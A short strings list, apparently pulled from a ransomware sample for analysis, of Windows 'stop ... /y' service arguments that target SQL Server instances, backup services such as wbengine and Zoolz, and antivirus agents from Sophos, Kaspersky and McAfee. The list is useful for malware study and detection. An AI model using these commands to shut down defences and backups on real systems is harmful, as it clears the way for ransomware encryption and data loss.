"String Value"
"stop SQLAgent$CITRIX_METAFRAME /y"
"stop \"SQL Backups\" /y"
"stop MSSQL$PROD /y"
"stop \"Zoolz 2 Service\" /y"
"stop MSSQLServerADHelper /y "
"stop SQLAgent$PROD /y "
"stop msftesql$PROD /y "
"stop NetMsmqActivator /y"
"stop EhttpSrv /y"
"stop ESHASRV /y"
"stop MSSQL$SOPHOS /y"
"stop SQLAgent$SOPHOS /y"
"stop klnagent /y"
"stop MSSQL$SQLEXPRESS /y"
"stop SQLAgent$SQLEXPRESS /y"
"stop wbengine /y"
"stop kavfsslp /y"
"stop mfefire /y"
